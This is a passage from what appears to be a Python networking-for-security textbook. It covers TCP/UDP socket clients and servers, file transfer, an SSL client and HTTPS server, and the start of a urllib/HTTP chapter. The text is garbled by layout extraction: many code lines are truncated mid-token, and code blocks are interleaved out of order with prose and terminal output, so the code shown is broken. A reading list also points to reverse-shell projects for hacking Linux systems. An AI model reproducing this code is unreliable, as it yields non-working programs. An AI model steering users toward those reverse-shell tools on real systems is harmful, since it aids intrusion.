approach requires a parameter indicating the maximum number
of connections we want a client to accept:
server.listen(10) 
4. The accept() method will be used to accept requests from a
client socket. This method keeps waiting for incoming
connections and blocks execution until a response arrives. In
server = socket.socket(socket.AF_INET, socket.SO

this way, the server socket waits for another host client to
receive an input connection:
socket_client, (host, port) = server.accept() 
5. Once we have this socket object, we can communicate with the
client through it, using the recv() and send() methods for
TCP communication (or recvfrom() and sendfrom() for UDP
communication) that allow us to receive and send messages,
respectively.
The recv() method takes as a parameter the maximum
number of bytes to accept, while the send() method takes as
parameters the data for sending the conﬁrmation of data
received:
received_data = socket_client.recv(1024) 
print("Received data: ", received_data) 
socket_client.send(received) 
6. To create a client, we must create the socket object, use the
connect() method to connect to the server, and use the
send() method to send a message to the server. The method
argument in the connect() method is a tuple with host and
port parameters, just like the previously mentioned bind()
method:
socket_client = socket.socket(socket.AF_INET, so
socket_client.connect(("localhost", 9999)) 

Let’s see a complete example where the client sends the server a
message, and the server repeats the received message.
Implementing the TCP server
In the following example, we are going to implement a
multithreaded TCP server. The server socket opens a TCP socket on
localhost 9999 and listens to requests in an inﬁnite loop. When the
server receives a request from the client socket, it will return a
message indicating that a connection has been established from
another machine. You can ﬁnd the following code in the
tcp_server.py ﬁle inside the tcp_client_server folder:
socket_client.send("message") 
import socket 
SERVER_IP   = "127.0.0.1" 
SERVER_PORT = 9999 
server = socket.socket(socket.AF_INET, socket.SOCK_S
server.bind((SERVER_IP,SERVER_PORT)) 
server.listen(5) 
print("[*] Server Listening on %s:%d" % (SERVER_IP,S
client,addr = server.accept() 
client.send("I am the server accepting connections o
print("[*] Accepted connection from: %s:%d" % (addr[
while True: 
    request = client.recv(1024).decode() 
    print("[*] Received request :%s" % (request)) 
    if request!="quit": 

In the previous code, the while loop keeps the server program alive
and does not allow the script to end. The server.listen(5)
instruction tells the server to start listening, with the maximum
backlog of connections set to ﬁve clients.
When executing the server script, we can see the IP address and port
where it is listening, and messages received from the client:
$ python tcp_server.py 
[*] Server Listening on 127.0.0.1:9999 
[*] Accepted connection from: 127.0.0.1:49300 
[*] Received request :hello world 
[*] Received request :quit 
The server socket opens a TCP socket on port 9999 and listens for
requests in an inﬁnite loop. When the server receives a request from
the client socket, it will return a message indicating that a connection
has occurred from another machine.
Implementing the TCP client
The client socket opens the same type of socket the server has
created and sends a message to the server. The server responds and
        client.send(bytes("ACK","utf-8")) 
    else: 
        break 
client.close() 
server.close() 

ends its execution, closing the socket client.
In the following example, we are conﬁguring an HTTP server at
address 127.0.0.1 through standard port 9998. Our client will
connect to the same IP address and port to receive 1024 bytes of data
in the response and store it in a variable called buﬀer, to later show
that variable to the user. You can ﬁnd the following code in the
tcp_client.py ﬁle inside the tcp_client_server folder:
In the previous code, the s.connect((host,port)) instruction
connects the client to the server, and the s.recv(1024) method
import socket 
host="127.0.0.1" 
port = 9999
try: 
    mysocket = socket.socket(socket.AF_INET, socket
    mysocket.connect((host, port)) 
    print('Connected to host '+str(host)+' in port: 
    message = mysocket.recv(1024) 
    print("Message received from the server", messag
    while True: 
        message = input("Enter your message > ") 
        mysocket.sendall(bytes(message.encode('utf-8
        if message== "quit": 
            break 
except socket.errno as error: 
    print("Socket error ", error) 
finally: 
        mysocket.close() 

receives the messages sent by the server.
When executing the client script, we can see the IP address and port
where it is connected, the message received from the server, and the
messages that are being sent to the server:
Now that you know how to implement sockets in Python oriented to
connection with the TCP protocol for message passing between a
client and server, let’s move on to learning how to build an
application for passing messages between the client and server using
the UDP protocol.
Implementing a simple UDP client
and UDP server
In this section, we will review how you can set up your own UDP
client-server application with Python’s socket module. The
application will be a server that listens for all connections and
messages over a speciﬁc port and prints out any messages to the
console that have been exchanged between the client and server.
UDP is a protocol that is on the same level as TCP, that is, above the
IP layer. It oﬀers a service in disconnected mode to the applications
$ python tcp_client.py 
Connected to host 127.0.0.1 in port: 9999 
 
Message received from the server I am the server acc
Enter your message > hello world 
Enter your message > quit 

that use it. This protocol is suitable for applications that require
eﬃcient communication and don’t have to worry about packet loss.
Typical applications of UDP are internet telephony and video
streaming.
The only diﬀerence between working with TCP and UDP in Python
is that when creating the socket in UDP, you need to use
SOCK_DGRAM instead of SOCK_STREAM. The main diﬀerence between
TCP and UDP is that UDP is not connection-oriented, and this
means that there is no guarantee our packets will reach their
destinations, and no error notiﬁcation if a delivery fails.
Now we are going to implement the same application we have seen
before for passing messages between the client and the server. The
only diﬀerence is that now we are going to use the UDP protocol
instead of TCP.
We are going to create a synchronous UDP server, which means each
request must wait until the end of the process of the previous
request. The bind() method will be used to associate the port with
the IP address. To receive the message we use the recvfrom()
method. To send requests we use the sendto() method.
Implementing the UDP server
The main diﬀerence with the TCP version is that UDP does not have
control over errors in packets that are sent between the client and
server. Another diﬀerence between a TCP socket and a UDP socket
is that you need to specify SOCK_DGRAM instead of SOCK_STREAM

when creating the socket object. You can ﬁnd the following code in
the udp_server.py ﬁle inside the udp_client_server folder:
In the previous code, we see that socket.SOCK_DGRAM creates a
UDP socket, and the instruction data, addr =
s.recvfrom(buffer) returns the data and the source’s address.
To bind the socket to an address and port number, we are using the
bind() method. Since we don’t need to establish a connection to the
client, we don’t use the listen() and accept() methods to
import socket,sys 
SERVER_IP = "127.0.0.1" 
SERVER_PORT = 6789 
socket_server=socket.socket(socket.AF_INET,socket.SO
socket_server.bind((SERVER_IP,SERVER_PORT)) 
print("[*] Server UDP Listening on %s:%d" % (SERVER_
while True: 
    data,address = socket_server.recvfrom(4096) 
    socket_server.sendto("I am the server accepting 
    data = data.strip() 
    print("Message %s received from %s: "% (data.dec
    try: 
        response = "Hi %s" % sys.platform 
    except Exception as e: 
        response = "%s" % sys.exc_info()[0] 
    print("Response",response) 
    socket_server.sendto(bytes(response,encoding='ut
socket_server.close() 

establish the connection. We can directly start communicating with
the client.
To receive a message in the UDP protocol, we use the recvfrom()
method, which takes the number of bytes to read as an input
argument and returns a tuple containing the data and the address
from which the data was received.
To send a message in the UDP protocol, we use the sendto()
method, which takes the data as its ﬁrst input argument and a tuple
containing the hostname and port number as the address of the
socket to send the data to.
When executing the server script, we can see the IP address and port
where the server is listening, and messages received from the client
when the communication is established:
Implementing the UDP client
To begin implementing the client, we will need to declare the IP
address and the port where the server is listening. This port number
is arbitrary, but you must ensure you are using the same port as the
$ python udp_server.py 
[*] Server UDP Listening on 127.0.0.1:6789 
Message hello world received from ('127.0.0.1', 5866
Response Hi linux 
Message hello received from ('127.0.0.1', 58669):  
Response Hi linux 

server and that you are not using a port that has already been taken
by another process or application:
SERVER_IP = "127.0.0.1" 
SERVER_PORT = 6789
Once the previous constants for the IP address and the port have
been established, it’s time to create the socket through which we will
be sending our UDP message to the server:
And ﬁnally, once we’ve constructed our new socket, it’s time to
write the code that will send our UDP message:
You can ﬁnd the following code in the udp_client.py ﬁle inside
the udp_client_server folder:
clientSocket = socket.socket(socket.AF_INET, socket
address = (SERVER_IP ,SERVER_PORT) 
socket_client.sendto(bytes(message,encoding='utf8'),
import socket 
SERVER_IP = "127.0.0.1" 
SERVER_PORT = 6789 
address = (SERVER_IP ,SERVER_PORT) 
socket_client=socket.socket(socket.AF_INET,socket.SO
while True: 

In the preceding code, we are creating an application client based on
the UDP protocol. To send a message to a speciﬁc address, we are
using the sendto() method, and to receive a message from the
server application, we are using the recvfrom() method.
When executing the client script, we can see the message received
from the server and the messages that are being sent to the server:
Finally, it’s important to consider that if we try to use SOCK_STREAM
with the UDP socket, we will probably get the following error:
    message = input("Enter your message > ") 
    if message=="quit": 
        break 
    socket_client.sendto(bytes(message,encoding='utf
    response_server,addr = socket_client.recvfrom(40
    print("Response from the server => %s" % respons
socket_client.close() 
$ python udp_client.py 
Enter your message > hello world 
Response from the server => I am the server acceptin
Enter your message > hello 
Response from the server => Hi linux 
Enter your message > quit 
socket.error: [Errno 10057] A request to send or rec

Hence, it is important to remember that we need to use the same
socket type for the client and the server when we are building
applications oriented to passing messages with sockets.
Implementing an HTTP server in
Python
Knowing the methods that we have reviewed previously, we can
implement our own HTTP server. For this task, we could use the
bind() method, which accepts the IP address and port as
parameters.
The socket module provides the listen() method, which allows
you to queue up to a maximum of n requests. For example, we
could set the maximum number of requests to 5 with the
mysocket.listen(5) statement.
In the following example, we are using localhost, to accept
connections from the same machine. The port could be 80, but since
you need root privileges, we will use one greater than or equal to
8080. You can ﬁnd the following code in the http_server.py ﬁle
in the http_server folder:
import socket 
mySocket = socket.socket(socket.AF_INET, socket.SOCK
mySocket.bind(('localhost', 8080)) 
mySocket.listen(5) 
while True: 
    print('Waiting for connections') 

Here, we are establishing the logic of our server every time it
receives a request from a client. We are using the accept() method
to accept connections, read incoming data with the recv() method,
and respond to an HTML page to the client with the send()
method.
The send() method allows the server to send bytes of data to the
speciﬁed target deﬁned in the socket that is accepting connections.
The key here is that the server is waiting for connections on the client
side with the accept() method.
Testing the HTTP server
If we want to test the HTTP server, we could create another script
that allows us to obtain the response sent by the server that we have
created. You can ﬁnd the following code in the
testing_http_server.py ﬁle in the http_server folder:
    (recvSocket, address) = mySocket.accept() 
    print('HTTP request received:') 
    print(recvSocket.recv(1024)) 
    recvSocket.send(bytes("HTTP/1.1 200 OK\r\n\r\n <
    recvSocket.close() 
import socket 
webhost = 'localhost' 
webport = 8080
print("Contacting %s on port %d ..." % (webhost, web
webclient = socket.socket(socket.AF_INET, socket.SOC

After running the previous script when doing a request over the
HTTP server created in localhost:8080, you should receive the
following output:
Contacting localhost on port 8080 ... 
Response from localhost: 
HTTP/1.1 200 OK 
<html><body><h1>Hello World!</h1></body></html> 
In the previous output, we can see that the HTTP/1.1 200 OK
response is returned to the client. In this way, we are testing that the
server is implemented successfully.
In this section, we have reviewed how you can implement your own
HTTP server using the client/server approach with the TCP protocol.
The server application is a script that listens for all client connections
and sends the response to the client.
Sending files via sockets
The following example’s objective is to implement a client-server
application that allows the sending of ﬁles between the client and
server. The idea is to establish a client-server connection between
webclient.connect((webhost, webport)) 
webclient.send(bytes("GET / HTTP/1.1\r\nHost: localh
reply = webclient.recv(4096) 
print("Response from %s:" % webhost) 
print(reply.decode()) 

two Python programs via the standard socket module and send a ﬁle
from the client to the server.
The ﬁle transfer logic is contained in two functions: the client script
deﬁnes a send_file() function to send a ﬁle through a socket, and
the server script deﬁnes a receive_file() function that allows the
ﬁle to be received. In addition, the code is prepared to send any ﬁle
format and of all sizes.
You can ﬁnd the following code in the send_file_client.py ﬁle in
the send_file_sockets folder:
On the client side, the send_file() method provides the following
tasks:
1. Gets the size of the ﬁle to send.
import os 
import socket 
import struct 
def send_file(sock: socket.socket, filename): 
    filesize = os.path.getsize(filename) 
    sock.sendall(struct.pack("<Q", filesize)) 
    with open(filename, "rb") as f: 
        while read_bytes := f.read(1024): 
            sock.sendall(read_bytes) 
with socket.create_connection(("localhost", 9999)) a
    print("Connecting with the server...") 
    print("Sending file...") 
    send_file(connection, "send_file_client.py") 
    print("File sended") 

2. Informs the server of the number of bytes that will be sent using
the send_all() method from the socket object.
3. Sends the ﬁle in blocks of 1024 bytes using the send_all()
method.
On the server side, the receive_file_size() function makes sure
the bytes indicating the size of the ﬁle to be sent are received, which
is encoded by the client via struct.pack(), a function that
generates a sequence of bytes representing the size of the ﬁle. You
can ﬁnd the following code in the send_file_server.py ﬁle in the
send_file_sockets folder:
On the client side, the receive_file() function method provides
the following tasks:
import socket 
import struct 
def receive_file_size(sock: socket.socket): 
    fmt = "<Q" 
    expected_bytes = struct.calcsize(fmt) 
    received_bytes = 0 
    stream = bytes() 
    while received_bytes < expected_bytes: 
        chunk = sock.recv(expected_bytes - received_
        stream += chunk 
        received_bytes += len(chunk) 
    filesize = struct.unpack(fmt, stream)[0] 
    return filesize 

1. Reads from the socket the number of bytes to be received from
the ﬁle.
2. Opens a new ﬁle to save the received data.
3. Receives the ﬁle data in blocks of 1024 bytes until reaching the
total number of bytes reported by the client.
You can ﬁnd the following code in the send_file_server.py ﬁle in
the send_file_sockets folder:
To test your code, you need to make sure to modify the calls to the
send_file() and receive_file() functions with the path of the
ﬁle you want to send and the path of the ﬁle you want to receive it
def receive_file(sock: socket.socket, filename): 
    filesize = receive_file_size(sock) 
    with open(filename, "wb") as f: 
        received_bytes = 0 
        while received_bytes < filesize: 
            chunk = sock.recv(1024) 
            if chunk: 
                f.write(chunk) 
                received_bytes += len(chunk) 
with socket.create_server(("localhost", 9999)) as se
    print("Waiting the client connection on localhos
    connection, address = server.accept() 
    print(f"{address[0]}:{address[1]} connected.") 
    print("Receiving file...") 
    receive_file(connection, "file_received.py") 
    print("File received") 

to, which in the current code is the ﬁle called
send_file_client.py, and is received with the name
file_received.py. First, we execute the server script in a terminal,
and in another terminal, we execute the client script:
$ python send_file_server.py 
Waiting the client connection on localhost:999 ... 
127.0.0.1:48550 connected. 
Receiving file... 
File received 
$ python send_file_client.py 
Connecting with the server... 
Sending file... 
File sended 
In the previous example, we have reviewed how we can send a ﬁle
in a client-server application. Next, we will discuss the ssl module
and its use in conjunction with the socket module to connect and
create servers securely.
Implementing secure sockets with
the TLS and SSL modules
The standard Python library provides ssl as a built-in module that
can be used as a minimalistic HTTP/HTTPS web server. It provides
support for the protocol and allows you to extend capabilities by
subclassing. This module provides access to Transport Layer
Security encryption and uses the openssl module at a low level for

managing certiﬁcates. In the documentation, you can ﬁnd some
examples on establishing a connection and geĴing certiﬁcates from a
server in a secure way. You can ﬁnd the documentation about this
module at this URL:
https://docs.python.org/3/library/ssl.html.
Next, we are going to implement some functionalities this module
provides. For example, we could access the encryption protocols
supported by the ssl module. You can ﬁnd the following code in
the get_ciphers.py ﬁle inside the ssl folder:
In the code above, we are using the get_ciphers() method to get
the cipher protocols along with the name and version obtained:
$ python get_ciphers.py 
TLS_AES_256_GCM_SHA384 TLSv1.3 
TLS_CHACHA20_POLY1305_SHA256 TLSv1.3 
TLS_AES_128_GCM_SHA256 TLSv1.3 
ECDHE-ECDSA-AES256-GCM-SHA384 TLSv1.2 
ECDHE-RSA-AES256-GCM-SHA384 TLSv1.2 
ECDHE-ECDSA-AES128-GCM-SHA256 TLSv1.2 
ECDHE-RSA-AES128-GCM-SHA256 TLSv1.2 
ECDHE-ECDSA-CHACHA20-POLY1305 TLSv1.2 
ECDHE-RSA-CHACHA20-POLY1305 TLSv1.2 
import ssl 
ciphers = ssl.SSLContext(ssl.PROTOCOL_SSLv23).get_ci
for cipher in ciphers: 
    print(cipher['name']+" "+cipher['protocol'])  

ECDHE-ECDSA-AES256-SHA384 TLSv1.2 
ECDHE-RSA-AES256-SHA384 TLSv1.2 
ECDHE-ECDSA-AES128-SHA256 TLSv1.2 
ECDHE-RSA-AES128-SHA256 TLSv1.2 
DHE-RSA-AES256-GCM-SHA384 TLSv1.2 
DHE-RSA-AES128-GCM-SHA256 TLSv1.2 
DHE-RSA-AES256-SHA256 TLSv1.2 
DHE-RSA-AES128-SHA256 TLSv1.2 
Another functionality we can implement is to get the server
certiﬁcate from a speciﬁc domain. For example, we could get the
certiﬁcate from the python.org domain. You can ﬁnd the following
code in the get_server_certificate.py ﬁle inside the ssl folder:
import ssl 
address = ('python.org', 443) 
certificate = ssl.get_server_certificate(address) 
print(certificate) 
When executing the previous script, we have the possibility of
generating a ﬁle with the information of the certiﬁcate and
visualizing the key that it generates:
$ python get_server_certificate.py >> server_certifi
$ python get_server_certificate.py 
-----BEGIN CERTIFICATE----- 
MIIFKTCCBBGgAwIBAgISA+KJEyuCbf9DcYkoyEHvedfOMA0GCSqG
MDIxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0
EwJSMzAeFw0yMjEwMTExNzIyMTRaFw0yMzAxMDkxNzIyMTNaMBcx

We could continue with the implementation of a client that connects
securely to a domain through port 443. You can ﬁnd the following
code in the socket_ssl.py ﬁle inside the ssl folder:
DCoucHl0aG9uLm9yZzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
ZexqwwR/s0tmurNuQ+DhIX+Uzaii6LMRLitEwLO5DNIXhvMEE+ef
e6vSE3whskZRjL1mnUUwa2CChVA597+ZcLAyI+jG4tDJLl5LeJL3
S3bivNkTv07ahnI3ErDb9tUOmoputlFrpi6X9yuRaiKgfcWF+2Ir
f7zikFksAFIMLj4V+WUJH/c1xhYjTI4S1bX4gLJWBAAQxYgjUD9t
ey/U7F5MgKHBhCwOlXZvpGIP3ZTBS9J+82tJRE0OKrua7oExZcYN
43j+vp551FMOk3PcUtECAwEAAaOCAlIwggJOMA4GA1UdDwEB/wQE
HSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwDAYDVR0TAQH/BAIw
FgQUj4how3pl2R79o6SM9Qnw0FIjyeswHwYDVR0jBBgwFoAUFC6z
5h+vnYsUwsYwVQYIKwYBBQUHAQEESTBHMCEGCCsGAQUFBzABhhVo
by5sZW5jci5vcmcwIgYIKwYBBQUHMAKGFmh0dHA6Ly9yMy5pLmxl
IwYDVR0RBBwwGoIMKi5weXRob24ub3JnggpweXRob24ub3JnMEwG
CAYGZ4EMAQIBMDcGCysGAQQBgt8TAQEBMCgwJgYIKwYBBQUHAgEW
cHMubGV0c2VuY3J5cHQub3JnMIIBAwYKKwYBBAHWeQIEAgSB9ASB
JN+cTbp18jnFulj0bF38Qs96nzXEnh0JgSXttJkAAAGDyEhzeAAA
xsLhJoB6sYpymgqJ+OnKurO4snED/qaGjyZ+3QmcJQIgXYEIp+3M
cM6i/pY6UeCh2v3Ns6XtcPIAdgB6MoxU2LcttiDqOOBSHumEFnAy
o1LrUgAAAYPISHOKAAAEAwBHMEUCIQC4XUm4zYrfbA4eLgUgN0+5
4u+dxDWfpgIgUriJmuHMytvTzYOQYQPOeaflMzuqbEPKWujuilRu
hvcNAQELBQADggEBAKLEq+31TPcQi5PIwSh4kDTOPNskvW8SX/6n
WuhHNj+zzML8lFjzR+45Zm6KTKM+kY2XLHVz0MtEp2R5QD8KPmSI
616PEDKPiP72oH1ty/ti0hXDBUOY8onUIkcRRbdMun1/LwgVznGU
nGurrkySwO6ep2S9cXNtqlKZ60KTyL40Ok736sR1YNkvGbYUa/0w
kX6/2Fe14jXPrepbmYEP6u2LJso1/NOsPN57wThiKE+QXCUsykwI
JBicwHrPQzGnIGOm+zUAPRfygXjyDut/gDQV00k= 
-----END CERTIFICATE----- 

In the previous code, we see how it connects through a socket using
port 443 and obtains the cipher algorithm. Also, make a GET request
to read the headers of the response sent by the server:
import ssl 
import socket 
sock = socket.socket(socket.AF_INET, socket.SOCK_STR
secure_socket = ssl.wrap_socket(sock) 
data = bytearray() 
try: 
    secure_socket.connect(("www.google.com", 443)) 
    print(secure_socket.cipher()) 
    secure_socket.write(b"GET / HTTP/1.1 \r\n") 
    secure_socket.write(b"Host: www.google.com\n\n")
    data = secure_socket.read() 
    print(data.decode("utf-8")) 
except Exception as exception: 
    print("Exception: ", exception) 
$ python socket_ssl.py 
('TLS_AES_256_GCM_SHA384', 'TLSv1.3', 256) 
HTTP/1.1 200 OK 
Date: Thu, 10 Nov 2022 15:16:56 GMT 
Expires: -1 
Cache-Control: private, max-age=0 
Content-Type: text/html; charset=ISO-8859-1 
P3P: CP="This is not a P3P policy! See g.co/p3phelp 
Server: gws 
X-XSS-Protection: 0 

In the execution of the previous script, we can see the encryption
algorithm and the headers sent by the server.
We could continue with the implementation of a server
implementation with secure socket. For this task, we can implement
as a base an HTTP server that accepts GET requests using the
HTTPServer and BaseHTTPRequestHandler classes of the
http.server module. Later, we need to add the security layer
using the certiﬁcates generated for our domain. For the following
example, we need to generate a certiﬁcate for the HTTPServer script.
For the generation of certiﬁcates, we could use tools such as
OpenSSL using the following command:
X-Frame-Options: SAMEORIGIN 
Set-Cookie: AEC=AakniGOuBW49Q_Qv3ZpQEO-OX_2tP2afModK
Set-Cookie: __Secure-ENID=8.SE=ML8mFvchJl_JpkWwXwv8_
Set-Cookie: CONSENT=PENDING+459; expires=Sat, 09-Nov
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592
$ openssl req -x509 -newkey rsa:2048 -keyout key.pem
Generating a RSA private key 
......................................+++++ 
....................+++++ 
writing new private key to 'key.pem' 
Enter PEM pass phrase: 
Verifying - Enter PEM pass phrase: 
----- 
You are about to be asked to enter information that 
into your certificate request. 

The following example is a simple HTTP server that responds
Hello, world! to the requester. Note, that
self.send_response(200) and self.end_headers() are
mandatory instructions for sending responses and headers to the
client request. You can ﬁnd the following code in the
https_server.py ﬁle inside the ssl folder:
What you are about to enter is what is called a Dist
There are quite a few fields but you can leave some 
For some fields there will be a default value, 
If you enter '.', the field will be left blank. 
----- 
Country Name (2 letter code) [AU]: 
State or Province Name (full name) [Some-State]: 
Locality Name (eg, city) []: 
Organization Name (eg, company) [Internet Widgits Pt
Organizational Unit Name (eg, section) []: 
Common Name (e.g. server FQDN or YOUR name) []: 
Email Address []: 
from http.server import HTTPServer, BaseHTTPRequestH
import ssl 
class SimpleHTTPRequestHandler(BaseHTTPRequestHandle
    def do_GET(self): 
        self.send_response(200) 
        self.end_headers() 
        self.wfile.write(b'Hello, world!') 
if __name__ == '__main__': 
    https_server = HTTPServer(('localhost', 4443), S
    context = ssl.create_default_context(ssl.Purpose

In the code above, we see the implementation of the
SimpleHTTPRequestHandler class, which inherits from the
BaseHTTPRequestHandler class. This class has a do_GET method
for handling a GET request. In our main program, we create an
HTTP server using port 4443, and later we use
create_default_context(), to which we add the security layer
with the certiﬁcates. Finally, we use the wrap_socket() method of
the context object to establish the server on the created socket.
When executing the previous script, it ﬁrst asks for the PEM pass
phrase or the password we have used to create the certiﬁcate. If the
password is correct, we can make requests securely using hĴps on
the established port 4443:
When making a GET request using a browser on the server like
https://localhost:4443, it would call the do_GET() method and
return the message Hello world.
Summary
    context.load_cert_chain(certfile="cert.pem", key
    https_server.socket = context.wrap_socket(https_
    https_server.serve_forever() 
$ python https_server.py 
Enter PEM pass phrase: 
127.0.0.1 - - [10/Nov/2022 17:48:28] "GET / HTTP/1.1

In this chapter, we reviewed using the socket module for
implementing client-server architectures in Python with the TCP and
UDP protocols. First, we reviewed the socket module for
implementing a client and the main methods for resolving IP
addresses from domains, including exception management. We
continued to implement practical use cases, such as port scanning
and a client-server application with message passing using TCP and
UDP protocols. Finally, we implemented our own client-server
application in a secure way using SSL sockets.
The main advantage provided by sockets is they maintain the
connection in real time, and we can send and receive data from one
end of the connection to another. For example, we could create our
own chat, that is, a client-server application that allows messages to
be received and sent in real time.
In the next chapter, we will explore HTTP request packages for
working with Python, executing requests over a REST API, and
authentication in servers.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. Which method of the socket module allows a server socket to
accept requests from a client socket from another host?
2. Which methods of the socket module allow you to send and
receive data from an IP address?

3. Which method of the socket module allows you to implement
port scanning with sockets and to check the port state?
4. What is the diﬀerence between the TCP and UDP protocols, and
how do you implement them in Python with the socket module?
5. What is the Python module and the main classes we can use to
create an HTTP server?
Further reading
In the following links, you will ﬁnd more information about the
tools mentioned and the oﬃcial Python documentation for the
socket module:
Documentation socket module:
https://docs.python.org/3/library/socket.html
Python socket examples: https://realpython.com/python-
sockets
Secure socket connection:
https://docs.python.org/3/library/ssl.html
Other projects related to geĴing a reverse shell:
When a pentest is performed, sometimes critical vulnerabilities
are located that, when exploited, allow a shell to be generated,
which can be bound or reversed as appropriate. For this
purpose, there is an interesting project on GitHub called
Shellerator that, by means of a wizard, teaches valid commands
that can be executed against the target for the generation of a
shell. This project is developed in Python 3 and has a ﬁle called
requirements.txt to install all the dependencies using PIP.

Another interesting project is
https://github.com/0xTRAW/PwnLnX as an advanced multi-
threaded, multi-client Python reverse shell for hacking Linux
systems.
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

4
HTTP Programming and Web
Authentication
This chapter introduces the urllib and requests modules for
making requests and retrieving web resources. The third-party
requests module is a very popular alternative to the urllib
module; it has an elegant interface and a powerful feature set, and it
is a great tool for streamlining HTTP workﬂows. Also, we cover
HTTP authentication mechanisms and how we can manage them
with the requests module. Finally, we cover how to implement
OAuth clients and JWT for token generation in web applications
with the requests-oauthlib and jwt modules.
This chapter will provide us with the foundation to become familiar
with diﬀerent alternatives within Python when we need to use a
module that provides diﬀerent functionality to make requests to a
web service or a REST API.
The following topics will be covered in this chapter:
Building an HTTP client with the urllib module
Building an HTTP client with the requests module
Authentication mechanisms with Python

Implementing OAuth clients in Python with the requests-
oauthlib module
Implementing JSON Web Tokens (JWTs) in Python
Technical requirements
To get the most out of this chapter, you will need to know the basics
of Python programming and have some basic knowledge of HTTP.
Also, you will need to install the Python distribution on your local
machine. We will work with Python version 3.10, available at
https://www.python.org/downloads.
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Check out the following video to see the Code in Action:
https://packt.link/Chapter04.
Building an HTTP client with
urllib.request
The urllib.request package is the recommended Python
standard library package for HTTP tasks. The urllib package has a
simple interface and it has the capacity to manage all tasks related to
HTTP requests.

Introducing the HTTP protocol
HTTP is an application layer protocol that deﬁnes the rules that
clients, proxies, and servers need to follow for information exchange.
It consists of two elements:
A request made by the client to a speciﬁc resource on a remote
server, speciﬁed by a URL
A response sent by the server that supplies the resource the
client requested
The HTTP protocol is a stateless protocol that does not store the
exchanged information between client and server. Being a stateless
protocol for storing information during an HTTP transaction, it is
necessary to resort to other techniques for storing data. The most
common approaches are cookies (values stored on the client side) or
sessions (temporary memory spaces reserved to store information
about one or more HTTP transactions on the server side).
Servers return an HTTP code indicating the outcome of an operation
requested by the client. In addition, the requests may use headers to
include additional information in both requests and responses.
It is also important to note that the HTTP protocol uses sockets at a
low level to establish a client-server connection. In Python, we have
the ability to use a higher-level module such as urllib.request,
which abstracts us from low-level socket service.
With this basic understanding of the HTTP protocol, we’ll now go
one step further and build HTTP clients using diﬀerent Python
libraries.

Every time a request is made to a web server, it receives and
processes the request, to later return the requested resources
together with the HTTP headers. The status codes of an HTTP
response indicate whether a speciﬁc HTTP request has been
successfully completed.
We can read the status code of a response using its status property.
The value of 200 is an HTTP status code that tells us that the request
has been successful.
Status codes are classiﬁed into the following groups:
100: Informational
200: Success
300: Redirection
400: Client error
500: Server error
Within the 3XX status code class, we can ﬁnd the 302 redirection
code, which indicates that a certain URL given by the location
headers has been temporarily moved, directing them straight to the
new location. Another code that we can ﬁnd is 307, which is used as
an internal redirect in cases where the browser detects that the URL
is using HTTPS.
In the next section, we will review the urllib module, which allows
us to test the response of a website or web service and is a good
option for implementing the HTTP clients for both the HTTP and
HTTPS protocols.
Introducing the urllib module

The urllib module allows access to any resource published on the
network (web page, ﬁles, directories, images, and so on) through
various protocols (HTTP, FTP, and SFTP). To start consuming a web
service, we must import the following modules:
>>> import urllib.request 
>>> import urllib.parse 
Using the urlopen function, an object like a ﬁle is generated in
which to read from the URL. This object has methods such as read,
readline, readlines, and close, which work with ﬁle objects,
although we are working with wrapper methods that abstract us
from using low-level sockets.
The urllib.request module allows access to a
resource published on the internet through its
address. If we go to the documentation of the Python 3
module,
https://docs.python.org/3/library/urllib.req
uest.html#module-urllib.request, we will see all
the functions that have this class.
The urlopen function provides an optional data parameter for
sending information to HTTP addresses using the POST method,
where the request itself sends parameters. This parameter is a string
with the correct encoding:

In the following script, we are using the urlopen method to do a
POST request using the data parameter as a dictionary. You can ﬁnd
the following code in the urllib_post_request.py ﬁle inside the
urllib.request folder:
In the preceding code, we are doing a POST request using the data
dictionary. We are using the encode method over the data
dictionary due to the POST data needing to be in bytes format.
Retrieving the contents of a URL is a straightforward process when
done using urllib. You can open the Python interpreter and
execute the following instructions:
urllib.request.urlopen (url, data = None, [timeout,]
import urllib.request 
import urllib.parse 
data_dictionary = {"id": "0123456789"} 
data = urllib.parse.urlencode(data_dictionary) 
data = data.encode('ascii') 
with urllib.request.urlopen("http://httpbin.org/post
    print(response.read().decode('utf-8')) 
>>> from urllib.request import urlopen 
>>> response = urlopen('http://www.packtpub.com') 
>>> response 
<http.client.HTTPResponse object at 0x7fa3c53059b0> 
>>> response.readline() 

Here we are using the urllib.request.urlopen() method to send
a request and receive a response for the resource at the
https://www.packtpub.com domain – in this case, an HTML page.
We will then print out the ﬁrst line of the HTML we receive, with the
readline() method from the response object.
The urlopen() method also supports the speciﬁcation of a timeout
for the request that represents the waiting time in the request; that is,
if the page takes more than what we indicated, it will result in an
error:
In the previous example, we can see that the urlopen() method
returns an instance of the http.client.HTTPResponse class. The
response object returns information to us with the requested and
response data:
<http.client.HTTPResponse object at 0x03C4DC90> 
If we get a response in JSON format, we can use the Python json
module to process the json response:
>>> print(urllib.request.urlopen("http://packtpub.co
>>> import json 
>>> response = urllib.request.urlopen(url,timeout=30
>>> json_response = json.loads(response.read()) 

In the following script, we make a request to a service that returns
the data in JSON format. You can ﬁnd the following code in the
json_response.py ﬁle inside the urllib.request folder:
In the previous code, we are using a service that returns a JSON
document. To read this document, we are using a json module,
which that provides the loads() method, which returns a
dictionary of the json response. In the output of the previous script,
we can see that the json response returns a dictionary with the
key:value format for each header:
Now that you know the basics of the urllib.request module, let’s
move on to learning about customizing the request headers with this
module.
Get request and response headers
import urllib.request 
import json 
url= "http://httpbin.org/get"
with urllib.request.urlopen(url) as response_json: 
    data_json= json.loads(response_json.read().decod
    print(data_json) 
{'args': {}, 'headers': {'Accept-Encoding': 'identit

There are two main parts to HTTP requests – a header and a body.
Headers are information lines that contain speciﬁc metadata about
the response and tell the client how to interpret the response. With
this module, we can test whether the headers can provide web server
information.
HTTP headers contain diﬀerent information about the HTTP request
and the client that you are using for doing the request. For example,
User-Agent provides information about the browser and operating
system you are using to perform the request.
The following script will obtain the site headers through the
response object’s headers. For this task, we can use the headers
